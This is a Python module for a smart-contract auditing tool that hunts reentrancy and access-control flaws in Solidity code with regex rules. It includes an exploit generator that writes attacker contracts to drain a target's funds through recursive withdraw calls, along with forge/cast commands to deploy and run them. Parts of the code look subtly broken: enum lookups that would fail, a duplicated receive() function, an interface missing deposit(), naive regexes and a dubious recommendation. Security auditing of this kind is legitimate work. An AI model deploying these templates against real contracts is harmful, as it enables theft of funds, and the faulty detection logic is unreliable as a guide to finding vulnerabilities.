"""
Solidify Reentrancy Hunter
Hunt for reentrancy vulnerabilities with comprehensive detection

Author: Peace Stephen (Tech Lead)
Description: Specialized hunter for reentrancy vulnerabilities in smart contracts
"""

import re
import logging
import json
import hashlib
from typing import Dict, Any, List, Optional, Set, Callable, Tuple
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from collections import defaultdict

logger = logging.getLogger(__name__)


class ReentrancyPattern(Enum):
    CLASSIC = "classic"
    CROSS_FUNCTION = "cross_function"
    STORAGE_READ = "storage_read"
    DELEGATE = "delegate"
    ERC721 = "erc721"
    CALLBACK = "callback"
    UNPROTECTED = "unprotected"
    MULTIPLE_WITHDRAW = "multiple_withdraw"
    VISIBLE_MUTATION = "visible_mutation"


class ReentrancySeverity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class VulnerabilityStatus(Enum):
    CONFIRMED = "confirmed"
    SUSPECTED = "suspected"
    FALSE_POSITIVE = "false_positive"
    PENDING = "pending"


@dataclass
class ReentrancyFinding:
    pattern: ReentrancyPattern
    severity: ReentrancySeverity
    function: str
    description: str
    line_number: int
    external_call: str
    state_change: str
    recommendation: str
    code_snippet: str = ""
    cvss_score: float = 0.0
    cwe_id: str = ""
    status: VulnerabilityStatus = VulnerabilityStatus.PENDING


@dataclass
class FunctionAnalysis:
    name: str
    external_calls: List[str] = field(default_factory=list)
    state_reads: List[str] = field(default_factory=list)
    state_writes: List[str] = field(default_factory=list)
    modifiers: List[str] = field(default_factory=list)
    visibility: str = "public"
    has_reentrancy_guard: bool = False
    is_payable: bool = False
    lines: List[str] = field(default_factory=list)


@dataclass 
class ExploitScenario:
    name: str
    description: str
    preconditions: List[str] = field(default_factory=list)
    attack_steps: List[str] = field(default_factory=list)
    expected_impact: str = ""
    complexity: str = "medium"
    PoC_code: str = ""


REENTRANCY_PATTERNS = {
    "external_call_before_cei": {
        "pattern": r"\.(call|transfer|send)\s*\([^)]*\)\s*\.value\s*\(",
        "severity": "critical",
        "description": "External call before Checks-Effects-Interactions pattern",
        "cwe": "CWE-362",
        "cvss": 9.1,
        "impact": "Attacker can drain all contract funds through recursive calls"
    },
    "storage_after_external": {
        "pattern": r"(\.call|require|if)\s*\([^)]*\)[\s\n]+[a-zA-Z_]+\[[^\]]+\]\s*=",
        "severity": "critical", 
        "description": "Storage modification after external call",
        "cwe": "CWE-362",
        "cvss": 9.1,
        "impact": "State can be manipulated during external call"
    },
    "callback_state": {
        "pattern": r"(receive|fallback)\s*\(\s*\)\s*[\s\n]*{[^}]*\(msg\.sender\)",
        "severity": "critical",
        "description": "Callback function can modify state",
        "cwe": "CWE-362",
        "cvss": 9.1,
        "impact": "Recursive calls enabled through fallback"
    },
    "unprotected_withdraw": {
        "pattern": r"function\s+withdraw[^{]*{[^}]*\.call\s*\(",
        "severity": "high",
        "description": "Unprotected withdraw function",
        "cwe": "CWE-284",
        "cvss": 7.5,
        "impact": "Anyone can drain funds"
    },
    "uncontrolled_mint": {
        "pattern": r"function\s+mint[^{]*\{[^}]*(?!onlyMinter)",
        "severity": "critical",
        "description": "Uncontrolled mint function",
        "cwe": "CWE-284",
        "cvss": 9.8,
        "impact": "Unlimited token minting"
    },
    "approve_any": {
        "pattern": r"function\s+approve[^{]*\{[^}]*(?!onlyOwner)",
        "severity": "high",
        "description": "Unprotected approve",
        "cwe": "CWE-284",
        "cvss": 7.5,
        "impact": "Tokens can be stolen"
    },
    "set_owner_direct": {
        "pattern": r"function\s+setOwner[^{]*\{",
        "severity": "critical",
        "description": "Direct owner setting without timelock",
        "cwe": "CWE-284",
        "cvss": 8.5,
        "impact": "Complete protocol compromise"
    },
    "delegate_call": {
        "pattern": r"delegatecall\s*\(",
        "severity": "high",
        "description": "Delegate call usage",
        "cwe": "CWE-829",
        "cvss": 8.0,
        "impact": "Code execution in contract context"
    },
    "multiple_external": {
        "pattern": r"for\s*\{[^}]*\.call[^}]*\.call",
        "severity": "medium",
        "description": "Multiple external calls in loop",
        "cwe": "CWE-400",
        "cvss": 5.3,
        "impact": "Denial of service through gas exhaustion"
    },
    "call_value_loop": {
        "pattern": r"for\s*\{[^}]*\.call\{value[^}]*\}\s*\}",
        "severity": "medium",
        "description": "Value transfer in loop",
        "cwe": "CWE-400",
        "cvss": 5.3,
        "impact": "Possible DOS"
    }
}


REENTRANCY_GUARDS = [
    "nonReentrant",
    "reentrancyGuard", 
    "ReentrancyGuard",
    "nonReentrant_",
    "ReentrancyGuardUpgradeable",
    "Mutex",
    "ReentrancyGuardInitializable",
    "MutexUnlock"
]


EXTERNAL_CALLS = [
    ".call(",
    ".call.value(",
    ".transfer(",
    ".send(",
    "Address.sendValue",
    "Address.functionCallWithValue",
    "Address.isContract(",
    "call(address(0)",
    "address(this).call(",
    "extcodesize("
]


STATE_VARIABLE_PATTERNS = [
    r"balances\[",
    r"shares\[",
    r"allowances\[",
    r"userRewards\[",
    r"rewardPerTokenStored",
    r"credit[]",
    r"deposits\[",
    r"withdrawals\[",
    r"stakes\[",
    r"lockedAmount",
    r"claimed_"
]


class CallGraph:
    """Build call graph for functions"""
    
    def __init__(self):
        self.nodes: Dict[str, Set[str]] = defaultdict(set)
        self.edges: Dict[Tuple[str, str], str] = {}
    
    def add_node(self, function: str) -> None:
        self.nodes[function]
    
    def add_edge(self, from_func: str, to_func: str, call_type: str) -> None:
        self.nodes[from_func].add(to_func)
        self.edges[(from_func, to_func)] = call_type
    
    def get_calls_from(self, function: str) -> Set[str]:
        return self.nodes.get(function, set())
    
    def find_recursive_paths(self, start: str) -> List[List[str]]:
        paths = []
        visited = set()
        
        def dfs(current: str, path: List[str]):
            if current in visited:
                return
            
            visited.add(current)
            path.append(current)
            
            if current == start and len(path) > 1:
                paths.append(path[:])
            
            for next_func in self.get_calls_from(current):
                dfs(next_func, path.copy())
        
        dfs(start, [])
        return paths


class FunctionExtractor:
    """Extract function information"""
    
    def __init__(self):
        self._function_pattern = r"function\s+(\w+)\s*\(([^)]*)\)\s*(?:(?:public|private|external|internal|view|pure|payable|\s)*)(?:modifiers\s+(\w+))?"
        self._state_var_pattern = r"(?:mapping|memory|storage)\s+\w+\s+\w+\[([^\]]+)\]\s+(\w+)"
    
    def extract_all(self, code: str) -> List[FunctionAnalysis]:
        functions = []
        
        function_blocks = self._split_into_functions(code)
        
        for block in function_blocks:
            func = self._parse_function_block(block)
            if func:
                functions.append(func)
        
        return functions
    
    def _split_into_functions(self, code: str) -> List[str]:
        functions = []
        current = []
        depth = 0
        brace_depth = 0
        
        for line in code.split('\n'):
            if 'function ' in line and depth == 0:
                current = [line]
                depth = 1
                continue
            
            if depth > 0:
                current.append(line)
                brace_depth += line.count('{') - line.count('}')
                
                if brace_depth <= 0:
                    functions.append('\n'.join(current))
                    current = []
                    depth = 0
                    brace_depth = 0
        
        return functions
    
    def _parse_function_block(self, block: str) -> Optional[FunctionAnalysis]:
        name_match = re.search(self._function_pattern, block)
        if not name_match:
            return None
        
        func = FunctionAnalysis(
            name=name_match.group(1),
            lines=block.split('\n')
        )
        
        if "external" in block:
            func.visibility = "external"
        if "public" in block:
            func.visibility = "public"
        if "payable" in block:
            func.is_payable = True
        
        for guard in REENTRANCY_GUARDS:
            if guard in block:
                func.has_reentrancy_guard = True
        
        for call in EXTERNAL_CALLS:
            if call in block:
                func.external_calls.append(call)
        
        for pattern in STATE_VARIABLE_PATTERNS:
            if re.search(pattern, block):
                if "=" in block:
                    func.state_writes.append(pattern)
                else:
                    func.state_reads.append(pattern)
        
        return func


class ReentrancyPatternDetector:
    """Detect specific reentrancy patterns"""
    
    def __init__(self):
        self.patterns = REENTRANCY_PATTERNS
    
    def detect_all(self, code: str) -> List[ReentrancyFinding]:
        findings = []
        lines = code.split('\n')
        
        for i, line in enumerate(lines, 1):
            for name, pattern_info in self.patterns.items():
                if re.search(pattern_info["pattern"], line):
                    finding = self._create_finding(name, pattern_info, line, i)
                    findings.append(finding)
        
        return findings
    
    def _create_finding(
        self,
        name: str,
        pattern_info: Dict[str, Any],
        line: str,
        line_number: int
    ) -> ReentrancyFinding:
        severity = ReentrancySeverity[pattern_info["severity"].upper()]
        matches = re.search(r"function\s+(\w+)", line)
        func_name = matches.group(1) if matches else "unknown"
        
        return ReentrancyFinding(
            pattern=ReentrancyPattern[name.upper()],
            severity=severity,
            function=func_name,
            description=pattern_info["description"],
            line_number=line_number,
            external_call=self._find_external_call(line),
            state_change=self._find_state_change(line),
            recommendation=self._get_recommendation(name),
            code_snippet=line.strip()[:200],
            cvss_score=pattern_info.get("cvss", 0.0),
            cwe_id=pattern_info.get("cwe", ""),
            status=VulnerabilityStatus.CONFIRMED
        )
    
    def _find_external_call(self, line: str) -> str:
        for call in EXTERNAL_CALLS:
            if call in line:
                return call
        return ""
    
    def _find_state_change(self, line: str) -> str:
        if "=" in line and ("[" in line or "balance" in line):
            return "state modification"
        return ""
    
    def _get_recommendation(self, pattern_name: str) -> str:
        recommendations = {
            "external_call_before_cei": "Use Checks-Effects-Interactions pattern: update state before external calls",
            "storage_after_external": "Move storage updates before external calls",
            "callback_state": "Use ReentrancyGuard modifier in callback functions",
            "unprotected_withdraw": "Add onlyOwner or onlyAuthenticated modifier",
            "uncontrolled_mint": "Add onlyMinter role check",
            "approve_any": "Add owner or role permission check",
            "set_owner_direct": "Use timelock or multi-sig for ownership change",
            "delegate_call": "Validate target address is not malicious",
            "multiple_external": "Process external calls outside loops"
        }
        return recommendations.get(pattern_name, "Review and fix the vulnerability")


class CrossFunctionReentrancyDetector:
    """Detect cross-function reentrancy"""
    
    def __init__(self):
        self.extractor = FunctionExtractor()
        self.call_graph = CallGraph()
    
    def analyze(self, code: str) -> List[Dict[str, Any]]:
        findings = []
        functions = self.extractor.extract_all(code)
        
        for func in functions:
            if func.external_calls:
                self._build_graph(func, functions)
                
                paths = self.call_graph.find_recursive_paths(func.name)
                if paths:
                    findings.append({
                        "vulnerable_function": func.name,
                        "recursive_paths": paths,
                        "severity": "high",
                        "type": "cross_function_reentrancy"
                    })
        
        return findings
    
    def _build_graph(self, func: FunctionAnalysis, all_functions: List[FunctionAnalysis]) -> None:
        self.call_graph.add_node(func.name)
        
        for call in func.external_calls:
            for other in all_functions:
                if call.replace("(", "") in other.name:
                    self.call_graph.add_edge(func.name, other.name, call)


class GuardChecker:
    """Check for reentrancy guards"""
    
    def __init__(self):
        self.guards = REENTRANCY_GUARDS
    
    def check(self, code: str) -> Dict[str, Any]:
        result = {
            "has_guard": False,
            "guard_used": None,
            "guard_locations": [],
            "guard_effective": False
        }
        
        for guard in self.guards:
            if guard in code:
                if not result["has_guard"]:
                    result["has_guard"] = True
                    result["guard_used"] = guard
                result["guard_locations"].append(self._find_location(code, guard))
        
        result["guard_effective"] = self._is_guard_effective(code)
        
        return result
    
    def _find_location(self, code: str, guard: str) -> List[int]:
        lines = code.split('\n')
        locations = []
        
        for i, line in enumerate(lines, 1):
            if guard in line:
                locations.append(i)
        
        return locations
    
    def _is_guard_effective(self, code: str) -> bool:
        lines = code.split('\n')
        
        for line in lines:
            if "modifier nonReentrant" in line or "modifier onlyOnce" in line:
                return True
        
        return False


class ReentrancyHunter:
    """Main reentrancy hunter"""
    
    def __init__(self):
        self.pattern_detector = ReentrancyPatternDetector()
        self.cross_function_detector = CrossFunctionReentrancyDetector()
        self.guard_checker = GuardChecker()
        self.extractor = FunctionExtractor()
        
        logger.info("✅ Reentrancy Hunter initialized")
    
    def hunt(self, code: str) -> Dict[str, Any]:
        findings = self.pattern_detector.detect_all(code)
        cross_func = self.cross_function_detector.analyze(code)
        guard = self.guard_checker.check(code)
        functions = self.extractor.extract_all(code)
        
        vulnerabilities = []
        
        for finding in findings:
            vulnerabilities.append({
                "type": "reentrancy",
                "pattern": finding.pattern.value,
                "severity": finding.severity.value,
                "function": finding.function,
                "description": finding.description,
                "line": finding.line_number,
                "recommendation": finding.recommendation,
                "cvss_score": finding.cvss_score,
                "cwe_id": finding.cwe_id,
                "status": finding.status.value
            })
        
        for cf in cross_func:
            vulnerabilities.append({
                "type": "reentrancy",
                "pattern": "cross_function",
                "severity": cf.get("severity"),
                "function": cf.get("vulnerable_function"),
                "description": "Cross-function reentrancy through recursive paths",
                "recommendation": "Apply reentrancy guard to all vulnerable functions"
            })
        
        return {
            "vulnerabilities": vulnerabilities,
            "cross_function_findings": cross_func,
            "guard_status": guard,
            "functions_analyzed": len(functions),
            "total_findings": len(findings) + len(cross_func)
        }
    
    def check_guard(self, code: str) -> bool:
        return self.guard_checker.check(code)["has_guard"]


class ExploitGenerator:
    """Generate exploit PoCs"""
    
    def __init__(self):
        self._scenarios = {}
    
    def generate(self, vuln: Dict[str, Any]) -> str:
        vuln_type = vuln.get("type", "reentrancy")
        func_name = vuln.get("function", "withdraw")
        
        templates = {
            "reentrancy": self._generate_reentrancy_poc,
            "cross_function": self._generate_cross_function_poc
        }
        
        return templates.get(vuln_type, self._generate_default_poc)(func_name)
    
    def _generate_reentrancy_poc(self, func_name: str) -> str:
        return f"""
// Reentrancy Exploit Proof of Concept
// Target Function: {func_name}
// Attack Type: Classic Reentrancy

pragma solidity ^0.8.0;

interface IVulnerable {{
    function {func_name}() external payable;
    function deposits(address) external view returns (uint256);
}}

contract ReentrancyAttacker {{
    IVulnerable public target;
    address public owner;
    uint256 public initialDeposit;
    uint256 public stolenAmount;
    
    constructor(address _target) {{
        target = IVulnerable(_target);
        owner = msg.sender;
    }}
    
    // Step 1: Initial deposit to establish position
    function initialize() external payable {{
        require(msg.value >= 1 ether, "Need at least 1 ether");
        initialDeposit = msg.value;
        target.deposit{{value: msg.value}}();
    }}
    
    // Step 2: Initiate attack
    function attack() external {{
        uint256 balance = target.deposits(address(this));
        require(balance > 0, "No balance to steal");
        target.{func_name}();
    }}
    
    // Step 3: Callback triggers recursive call
    receive() external payable {{
        if (address(target).balance >= 1 ether) {{
            target.{func_name}();
        }} else {{
            // Step 4: Transfer stolen funds
            stolenAmount = address(this).balance;
            payable(owner).transfer(stolenAmount);
        }}
    }}
    
    // Prevent brick
    receive() external payable {{
        revert("Not accepting direct deposits");
    }}
}}

// Deployment Script
// forge create --rpc-url <RPC> --private-key <KEY> src/Attacker.sol:ReentrancyAttacker
// cast send <ATTACKER_CONTRACT> "initialize()" --value 1ether --rpc-url <RPC> --private-key <KEY>
// cast send <ATTACKER_CONTRACT> "attack()" --rpc-url <RPC> --private-key <KEY>
"""
    
    def _generate_cross_function_poc(self, func_name: str) -> str:
        return f"""
// Cross-Function Reentrancy PoC
// Vulnerable functions: {func_name}

pragma solidity ^0.8.0;

contract CrossFunctionAttacker {{
    address public target;
    address public owner;
    bool public firstCalled = false;
    
    constructor(address _target) {{
        target = _target;
        owner = msg.sender;
    }}
    
    function attack() external {{
        // First call - doesn't complete
        (bool ok, ) = target.call(abi.encodeWithSignature("funcA()"));
        require(ok, "A failed");
    }}
    
    function funcA() external {{
        if (!firstCalled) {{
            firstCalled = true;
            // Second vulnerable function called in same tx
            (bool ok, ) = target.call(abi.encodeWithSignature("funcB()"));
        }}
    }}
    
    receive() external payable {{
        if (firstCalled) {{
            // Second callback
            (bool ok, ) = target.call(abi.encodeWithSignature("funcA()"));
        }}
    }}
}}
"""
    
    def _generate_default_poc(self, func_name: str) -> str:
        return f"// PoC for {func_name}"


class ReentrancyReport:
    """Generate comprehensive reentrancy reports"""
    
    def __init__(self):
        self.hunter = ReentrancyHunter()
        self.exploit_gen = ExploitGenerator()
    
    def generate_report(self, code: str) -> Dict[str, Any]:
        results = self.hunter.hunt(code)
        
        critical_count = sum(1 for v in results["vulnerabilities"] if v.get("severity") == "critical")
        high_count = sum(1 for v in results["vulnerabilities"] if v.get("severity") == "high")
        
        report = {
            "vulnerability_type": "Reentrancy",
            "total_findings": results["total_findings"],
            "critical_count": critical_count,
            "high_count": high_count,
            "findings": results["vulnerabilities"],
            "guard_status": {
                "has_guard": results["guard_status"]["has_guard"],
                "guard_used": results["guard_status"]["guard_used"],
                "is_effective": results["guard_status"]["guard_effective"]
            },
            "risk_score": self._calculate_risk(results),
            "recommendations": self._get_recommendations(results),
            "exploit_poc": self._generate_poc(results)
        }
        
        return report
    
    def _calculate_risk(self, results: Dict[str, Any]) -> float:
        score = 0.0
        
        for vuln in results["vulnerabilities"]:
            severity = vuln.get("severity")
            if severity == "critical":
                score += 3.0
            elif severity == "high":
                score += 2.0
            elif severity == "medium":
                score += 1.0
        
        if results.get("guard_status", {}).get("has_guard"):
            score *= 0.5
        
        return min(10.0, round(score, 1))
    
    def _get_recommendations(self, results: Dict[str, Any]) -> List[str]:
        recommendations = [
            "Use OpenZeppelin ReentrancyGuard or similar guard",
            "Apply Checks-Effects-Interactions pattern strictly",
            "Update all state variables before external calls",
            "Use address(this).balance after external call"
        ]
        
        if not results.get("guard_status", {}).get("has_guard"):
            recommendations.insert(0, "URGENT: Add reentrancy guard modifier")
        
        return recommendations
    
    def _generate_poc(self, results: Dict[str, Any]) -> Dict[str, str]:
        pocs = {}
        
        for vuln in results["vulnerabilities"][:3]:
            func = vuln.get("function", "withdraw")
            pocs[func] = self.exploit_gen.generate(vuln)
        
        return pocs


def hunt(code: str) -> Dict[str, Any]:
    """Entry point for reentrancy hunting"""
    hunter = ReentrancyHunter()
    return hunter.hunt(code)


def generate_report(code: str) -> Dict[str, Any]:
    """Generate full report"""
    report = ReentrancyReport()
    return report.generate_report(code)


def check_guard(code: str) -> bool:
    """Quick check for reentrancy guard"""
    hunter = ReentrancyHunter()
    return hunter.check_guard(code)